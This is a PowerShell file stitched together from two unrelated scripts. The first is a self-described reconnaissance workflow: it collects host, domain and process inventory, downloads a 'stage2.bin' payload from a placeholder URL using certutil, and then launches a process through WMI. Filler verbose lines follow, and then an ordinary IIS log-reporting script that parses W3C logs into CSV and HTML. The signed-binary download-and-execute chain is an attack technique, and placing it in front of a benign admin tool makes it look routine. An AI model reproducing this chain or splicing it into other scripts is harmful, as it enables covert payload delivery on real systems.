<#
.SYNOPSIS
    WMI and signed-binary reconnaissance workflow.

.DESCRIPTION
    Collects process and system inventory through CIM, downloads a
    payload stage with a signed Windows binary, then creates
    a benign process through WMI and records the result.

.NOTES
    Process creation uses the WMI provider.
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'https://example.org:443/stage2.bin',
    [string]$PayloadPath = 'C:\ProgramData\stage1.bin',
    [string]$TracePath = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Inventory
function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

# LOLBin chain
function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = '',
        [string]$DestinationPath = ""
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $TransferResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $TransferResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Preparing working directory"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Start-Sleep -Seconds 3
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.PARAMETER LogRoot
    Overrides the default value defined in the parameter block.
.PARAMETER Days
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Invoke-IisLogReport.ps1 -Days 7 -TopN 20
.EXAMPLE
    .\Invoke-IisLogReport.ps1 -LogRoot C:\inetpub\logs\LogFiles\W3SVC2
.NOTES
    Author: IT Systems
    Last updated: 2026-06-03
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC2',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 7,

    [int]$TopN = 20,

    [string]$OutputPath = "C:\Reports\iis-top-2025-03-01.csv",
    [string]$HtmlPath = 'C:\Reports\iis-2025-03-01.html'
)

$WarningPreference = 'Continue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}
$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Tahoma; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$topUrls | ConvertTo-Html -Title 'Top URLs' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
